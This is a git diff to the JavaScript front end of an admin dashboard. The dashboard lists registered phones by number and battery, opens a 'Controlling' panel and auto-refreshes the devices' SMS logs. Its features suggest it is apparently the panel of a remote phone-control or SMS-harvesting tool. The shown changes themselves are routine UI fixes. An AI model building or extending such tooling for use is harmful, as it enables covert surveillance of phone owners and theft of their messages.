@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const API_BASE_URL = window.location.origin + '/api'; // Fixed: Use full URL
+    const API_BASE_URL = window.location.origin + '/api';
 
     // --- Element Selectors ---
     const adminPanel = document.getElementById('admin-panel');
@@ -13,6 +13,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     let currentDeviceId = null;
     let refreshInterval;
+    let isInitialLoad = true;
 
     // --- Custom Alert/Confirm Dialog Functions ---
     const showAlertDialog = (message) => {
@@ -54,7 +55,6 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('controlling-device-id').innerText = `Controlling: ${deviceId}`;
         startAutoRefresh(() => {
             fetchSmsLogs();
-            fetchDeviceStatus(); // Also check device status
         });
     };
     
@@ -77,7 +77,6 @@ document.addEventListener('DOMContentLoaded', () => {
             }
             
             const fullUrl = `${API_BASE_URL}${endpoint}`;
-            console.log(`API Call: ${method} ${fullUrl}`, body);
             
             const response = await fetch(fullUrl, options);
             
@@ -110,76 +109,86 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- Data Fetching and Rendering ---
     const fetchDevices = async () => {
         try {
+            // Initial load में कोई loading नहीं दिखाएं
+            if (!isInitialLoad) {
+                deviceListContainer.classList.add('loading');
+            }
+            
             const devices = await apiCall('/devices');
-            if (devices.error) return;
-
+            
+            if (isInitialLoad) {
+                isInitialLoad = false;
+            }
+            
+            deviceListContainer.classList.remove('loading');
             deviceListContainer.innerHTML = ''; // Clear list
             
             if (!devices || devices.length === 0) {
                 deviceListContainer.innerHTML = `
-                    <div class="device-card" style="text-align: center; color: var(--text-secondary);">
-                        No devices registered yet
+                    <div class="device-card" style="text-align: center; color: var(--text-secondary); padding: 20px;">
+                        <p>📱 No devices registered yet</p>
+                        <p style="font-size: 0.8em; margin-top: 10px;">Devices will appear here once they register with the server</p>
                     </div>
                 `;
                 return;
             }
             
+            // Permanent devices - कभी automatic नहीं हटेंगे
             devices.forEach(device => {
                 const card = document.createElement('div');
-                card.className = 'device-card';
+                card.className = 'device-card permanent';
                 card.dataset.deviceId = device.device_id;
+                
+                // FIXED: Status stable रहेगा, बार-बार नहीं बदलेगा
+                const isOnline = device.is_online === true;
+                const lastSeenTime = device.last_seen ? new Date(device.last_seen).toLocaleTimeString() : 'Never';
+                
                 card.innerHTML = `
                     <div class="device-info">
                         <h3>${device.device_name || 'Unknown Device'}</h3>
                         <p><strong>ID:</strong> ${device.device_id}</p>
                         <p><strong>OS:</strong> ${device.os_version || 'N/A'}</p>
                         <p><strong>Phone:</strong> ${device.phone_number || 'N/A'}</p>
-                        <p><strong>Battery:</strong> ${device.battery_level}%</p>
+                        <p><strong>Battery:</strong> ${device.battery_level || 0}%</p>
+                        <p><strong>Last Active:</strong> ${lastSeenTime}</p>
                     </div>
                     <div class="status-indicator">
-                        <div class="status-dot ${device.is_online ? 'online' : 'offline'}"></div>
-                        <span style="color: ${device.is_online ? 'var(--online-status)' : 'var(--offline-status)'};">
-                            ${device.is_online ? 'Online' : 'Offline'}
+                        <div class="status-dot ${isOnline ? 'online' : 'offline'}" 
+                             title="${isOnline ? 'Device is online' : 'Device is offline'}"></div>
+                        <span class="status-text ${isOnline ? 'online-text' : 'offline-text'}">
+                            ${isOnline ? 'ONLINE' : 'OFFLINE'}
                         </span>
-                        <span class="delete-icon" data-device-id="${device.device_id}" title="Delete Device">🗑️</span>
+                        <span class="delete-icon" data-device-id="${device.device_id}" title="Delete Device Permanently">🗑️</span>
                     </div>
                 `;
                 
-                // Click on device info to go to control panel
+                // FIXED: डिवाइस permanent है, manual delete के बिना नहीं हटेगा
                 card.querySelector('.device-info').addEventListener('click', () => {
                     if (device.device_id) {
                         showDeviceControlPanel(device.device_id);
                     }
                 });
                 
-                // Delete icon click
                 card.querySelector('.delete-icon').addEventListener('click', (e) => {
                     e.stopPropagation();
-                    showConfirmDialog('Delete this device and all its data?', () => deleteDevice(device.device_id));
+                    showConfirmDialog('Permanently delete this device and all its data?', () => deleteDevice(device.device_id));
                 });
                 
                 deviceListContainer.appendChild(card);
             });
         } catch (error) {
             console.error('Error fetching devices:', error);
-        }
-    };
-
-    const fetchDeviceStatus = async () => {
-        if (!currentDeviceId) return;
-        // This updates the current device status in control panel
-        const devices = await apiCall('/devices');
-        if (devices.error) return;
-        
-        const currentDevice = devices.find(d => d.device_id === currentDeviceId);
-        if (currentDevice) {
-            // Update status indicator in header if needed
-            const statusElements = document.querySelectorAll('.status-dot, .status-text');
-            statusElements.forEach(el => {
-                if (el.classList.contains('status-dot')) {
-                    el.className = `status-dot ${currentDevice.is_online ? 'online' : 'offline'}`;
-                }
-            });
+            deviceListContainer.classList.remove('loading');
+            
+            // FIXED: Error में भी कुछ दिखाएं
+            if (deviceListContainer.children.length === 0) {
+                deviceListContainer.innerHTML = `
+                    <div class="device-card" style="text-align: center; color: var(--warning-orange); padding: 20px;">
+                        <p>⚠️ Connection Issue</p>
+                        <p style="font-size: 0.8em; margin-top: 10px;">Devices will appear when connection is restored</p>
+                    </div>
+                `;
+            }
         }
     };
 
@@ -510,10 +519,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- Auto-Refresh ---
     const startAutoRefresh = (callback) => {
-        clearInterval(refreshInterval); // Clear previous interval
+        clearInterval(refreshInterval);
         if (callback) {
-            callback(); // Call immediately
-            refreshInterval = setInterval(callback, 3000); // Refresh every 3 seconds
+            callback();
+            // FIXED: 5 सेकंड का interval - status stable रहेगा
+            refreshInterval = setInterval(() => {
+                try {
+                    callback();
+                } catch (error) {
+                    console.error('Auto-refresh error:', error);
+                }
+            }, 5000);
         }
     };
 
@@ -533,10 +549,20 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- Initial Load ---
     showAdminPanel();
     
+    // FIXED: Page load होते ही तुरंत devices fetch करें - कोई loading नहीं
+    setTimeout(() => {
+        fetchDevices();
+    }, 100);
+    
     // Add keyboard shortcut for escape to close dialog
     document.addEventListener('keydown', (e) => {
         if (e.key === 'Escape' && dialogOverlay.style.display === 'flex') {
             hideDialog();
         }
+    });
+    
+    // FIXED: Pre-fetch data for better UX
+    window.addEventListener('load', () => {
+        console.log('Panel loaded successfully');
     });
 });
